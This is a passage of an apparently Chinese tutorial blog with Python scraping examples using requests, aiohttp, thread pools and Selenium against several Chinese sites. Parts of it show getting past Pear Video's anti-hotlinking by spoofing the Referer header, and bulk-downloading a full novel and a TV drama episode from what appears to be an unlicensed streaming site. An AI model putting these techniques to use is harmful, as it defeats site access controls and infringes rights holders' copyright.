class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> lxml <span class="token keyword">import</span> etree<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://beijing.zbj.com/search/f/?type=new&amp;kw=saas"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>html <span class="token operator">=</span> etree<span class="token punctuation">.</span>HTML<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>divs <span class="token operator">=</span> html<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"/html/body/div[6]/div/div/div[2]/div[4]/div[1]/div"</span><span class="token punctuation">)</span><span class="token keyword">for</span> div <span class="token keyword">in</span> divs<span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        price <span class="token operator">=</span> div<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"./div/div/a[2]/div[2]/div[1]/span[1]/text()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">"¥"</span><span class="token punctuation">)</span>        name <span class="token operator">=</span> <span class="token string">"saas"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>div<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"./div/div/a[2]/div[2]/div[2]/p/text()"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        company <span class="token operator">=</span> div<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"./div/div/a[1]/div[1]/p/text()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        address <span class="token operator">=</span> div<span class="token punctuation">.</span>xpath<span class="token punctuation">(</span><span class="token string">"./div/div/a[1]/div[1]/div/span/text()"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>price<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>name<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>company<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>address<span class="token punctuation">)</span>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">pass</span>resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="requests库使用Cookie"><a href="#requests库使用Cookie" class="headerlink" title="requests库使用Cookie"></a><code>requests</code>库使用Cookie</h2><h5 id="使用session"><a href="#使用session" class="headerlink" title="使用session"></a>使用session</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span>session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"loginName"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">,</span>    <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"https://passport.17k.com/ck/user/login"</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>resp <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="使用Cookie"><a href="#使用Cookie" class="headerlink" title="使用Cookie"></a>使用Cookie</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python">headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Cookie"</span><span class="token punctuation">:</span> <span class="token string">"*"</span><span class="token punctuation">&#125;</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://user.17k.com/ck/author/shelf?page=1&amp;appKey=2406394919"</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="防盗链-抓取梨视频"><a href="#防盗链-抓取梨视频" class="headerlink" title="防盗链 - 抓取梨视频"></a>防盗链 - 抓取梨视频</h2><p>梨视频的视频链接是在XHR中抓取到（<code>https://video.pearvideo.com/mp4/adshort/20210820/1629541188301-15751458_adpkg-ad_hd.mp4</code>）</p><p>并且被二次加工为</p><p>（<code>https://video.pearvideo.com/mp4/adshort/20210820/cont-1739559-15751458_adpkg-ad_hd.mp4</code>）</p><blockquote><p>即<code>1629541188301</code> 被加工成<code>cont-1739559</code></p></blockquote><p>使用<code>requests</code>请求之后发现存在防盗链，需要在请求头里加入<code>Referer</code>字段</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"https://pearvideo.com/video_1739559"</span><span class="token punctuation">&#125;</span>url <span class="token operator">=</span> <span class="token string">"https://pearvideo.com/video_1739559"</span>contId <span class="token operator">=</span> url<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>video_status <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://pearvideo.com/videoStatus.jsp?contId=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>contId<span class="token punctuation">&#125;</span></span><span class="token string">&amp;mrd=0.2949276285579938"</span></span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>video_status<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>js <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>systemTime <span class="token operator">=</span> js<span class="token punctuation">[</span><span class="token string">'systemTime'</span><span class="token punctuation">]</span>srcUrl <span class="token operator">=</span> js<span class="token punctuation">[</span><span class="token string">'videoInfo'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'videos'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'srcUrl'</span><span class="token punctuation">]</span>srcUrl <span class="token operator">=</span> srcUrl<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>systemTime<span class="token punctuation">,</span> <span class="token string-interpolation"><span class="token string">f"cont-</span><span class="token interpolation"><span class="token punctuation">&#123;</span>contId<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"a.mp4"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>srcUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">)</span>resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程池爬取新发地"><a href="#线程池爬取新发地" class="headerlink" title="线程池爬取新发地"></a>线程池爬取新发地</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> concurrent<span class="token punctuation">.</span>futures <span class="token keyword">import</span> ThreadPoolExecutor<span class="token punctuation">,</span> ProcessPoolExecutor<span class="token keyword">import</span> requestsheaders <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">down_one_page</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> dat<span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> data<span class="token operator">=</span>dat<span class="token punctuation">)</span>    page_data <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'list'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> page_data<span class="token punctuation">:</span>        prodName <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'prodName'</span><span class="token punctuation">]</span>        lowPrice <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'lowPrice'</span><span class="token punctuation">]</span>        highPrice <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'highPrice'</span><span class="token punctuation">]</span>        place <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'place'</span><span class="token punctuation">]</span>        unitInfo <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'unitInfo'</span><span class="token punctuation">]</span>        specInfo <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'specInfo'</span><span class="token punctuation">]</span>        pubDate <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'pubDate'</span><span class="token punctuation">]</span>        write_file <span class="token operator">=</span> prodName<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>lowPrice<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>highPrice<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>place<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>unitInfo<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>specInfo<span class="token operator">+</span><span class="token string">" -- "</span><span class="token operator">+</span>pubDate<span class="token operator">+</span><span class="token string">"\n"</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"xinfadi.txt"</span><span class="token punctuation">,</span> <span class="token string">"a+"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>write_file<span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"limit"</span><span class="token punctuation">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span>            <span class="token string">"current"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">with</span> ThreadPoolExecutor<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">as</span> t<span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token string">"limit"</span><span class="token punctuation">:</span> <span class="token string">"20"</span><span class="token punctuation">,</span>                <span class="token string">"current"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>            <span class="token punctuation">&#125;</span>            t<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>down_one_page<span class="token punctuation">,</span> <span class="token string">"http://www.xinfadi.com.cn/getPriceData.html"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="aiohttp异步爬取整本小说"><a href="#aiohttp异步爬取整本小说" class="headerlink" title="aiohttp异步爬取整本小说"></a>aiohttp异步爬取整本小说</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> asyncio<span class="token keyword">import</span> aiohttp<span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> aiofiles<span class="token comment"># https://dushu.baidu.com/api/pc/getCatalog?data=&#123;"book_id":"4306063500"&#125;</span><span class="token comment"># https://dushu.baidu.com/api/pc/getChapterContent?data=&#123;"book_id":"4306063500","cid":"4306063500|11348579","need_bookinfo":1&#125;</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">down</span><span class="token punctuation">(</span>cid<span class="token punctuation">,</span> bid<span class="token punctuation">,</span> title<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">"book_id"</span><span class="token punctuation">:</span> bid<span class="token punctuation">,</span>        <span class="token string">"cid"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>bid<span class="token punctuation">&#125;</span></span><span class="token string">|</span><span class="token interpolation"><span class="token punctuation">&#123;</span>cid<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span>        <span class="token string">"need_bookinfo"</span><span class="token punctuation">:</span> <span class="token number">1</span>    <span class="token punctuation">&#125;</span>    data <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://dushu.baidu.com/api/pc/getChapterContent?data=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>    <span class="token keyword">async</span> <span class="token keyword">with</span> aiohttp<span class="token punctuation">.</span>ClientSession<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>        <span class="token keyword">async</span> <span class="token keyword">with</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span> <span class="token keyword">as</span> resp<span class="token punctuation">:</span>            dic <span class="token operator">=</span> <span class="token keyword">await</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">async</span> <span class="token keyword">with</span> aiofiles<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f'novel/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>title<span class="token punctuation">&#125;</span></span><span class="token string">.txt'</span></span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"w"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                <span class="token keyword">await</span> f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>dic<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'novel'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">getCatalog</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span>    dic <span class="token operator">=</span> resp<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    tasks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> dic<span class="token punctuation">[</span><span class="token string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'novel'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'items'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span>        cid <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token string">'cid'</span><span class="token punctuation">]</span>        tasks<span class="token punctuation">.</span>append<span class="token punctuation">(</span>asyncio<span class="token punctuation">.</span>create_task<span class="token punctuation">(</span>down<span class="token punctuation">(</span>cid<span class="token punctuation">,</span> bookid<span class="token punctuation">,</span> title<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">await</span> asyncio<span class="token punctuation">.</span>wait<span class="token punctuation">(</span>tasks<span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    bookid <span class="token operator">=</span> <span class="token string">"4306063500"</span>    url <span class="token operator">=</span> <span class="token string">'https://dushu.baidu.com/api/pc/getCatalog?data=&#123;"book_id":"'</span><span class="token operator">+</span>bookid<span class="token operator">+</span><span class="token string">'"&#125;'</span>    asyncio<span class="token punctuation">.</span>get_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>run_until_complete<span class="token punctuation">(</span>getCatalog<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="抓取一部视频"><a href="#抓取一部视频" class="headerlink" title="抓取一部视频"></a>抓取一部视频</h2><blockquote><h4 id="找到m3u8"><a href="#找到m3u8" class="headerlink" title="找到m3u8"></a>找到m3u8</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">url <span class="token operator">=</span> <span class="token string">"https://91kanju.com/vod-play/54812-1-1.html"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) "</span>                  <span class="token string">"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.12 Safari/537.36"</span><span class="token punctuation">&#125;</span>resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>obj <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r"url: '(?P&lt;m3u8>.*?)',"</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>m3u8_url <span class="token operator">=</span> obj<span class="token punctuation">.</span>search<span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token string">"m3u8"</span><span class="token punctuation">)</span>resp2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>m3u8_url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"哲仁王后.m3u8"</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp2<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="通过m3u8下载ts文件"><a href="#通过m3u8下载ts文件" class="headerlink" title="通过m3u8下载ts文件"></a>通过m3u8下载ts文件</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">n <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"哲仁王后.m3u8"</span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"r"</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> line <span class="token keyword">in</span> f<span class="token punctuation">:</span>        line <span class="token operator">=</span> line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> line<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        resp3 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>line<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>        f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"video/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">.ts"</span></span><span class="token punctuation">,</span> mode<span class="token operator">=</span><span class="token string">"wb"</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>resp3<span class="token punctuation">.</span>content<span class="token punctuation">)</span>        f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        resp3<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">->ok"</span></span><span class="token punctuation">)</span>        n <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="将ts文件拼接成视频"><a href="#将ts文件拼接成视频" class="headerlink" title="将ts文件拼接成视频"></a>将ts文件拼接成视频</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">all_ts <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'video/'</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'video/video.mp4'</span><span class="token punctuation">,</span> <span class="token string">'wb+'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>all_ts<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'video/</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">.ts'</span></span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> e<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>e<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="selenium模块"><a href="#selenium模块" class="headerlink" title="selenium模块"></a><code>selenium</code>模块</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver <span class="token keyword">import</span> Chrome<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>keys <span class="token keyword">import</span> Keys<span class="token keyword">import</span> timeweb <span class="token operator">=</span> Chrome<span class="token punctuation">(</span><span class="token punctuation">)</span>web<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.lagou.com/"</span><span class="token punctuation">)</span><span class="token comment"># 点击全国</span>el <span class="token operator">=</span> web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="changeCityBox"]/p[1]/a'</span><span class="token punctuation">)</span>el<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 如果点击全国之后，页面需要刷新，那么刷新的时候找不到输入框，也就导致输入Python的时候报错，所以加入延时</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment"># 找到输入框 -> 输入python -> 回车</span>web<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="search_input"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span><span class="token string">"python"</span><span class="token punctuation">,</span> Keys<span class="token punctuation">.</span>ENTER<span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>li_list <span class="token operator">=</span> web<span class="token punctuation">.</span>find_elements_by_xpath<span class="token punctuation">(</span><span class="token string">'//*[@id="jobList"]/div[1]/div'</span><span class="token punctuation">)</span><span class="token keyword">for</span> li <span class="token keyword">in</span> li_list<span class="token punctuation">:</span>    job_name <span class="token operator">=</span> li<span class="token punctuation">.</span>find_element_by_xpath<span class="token punctuation">(</span><span class="token 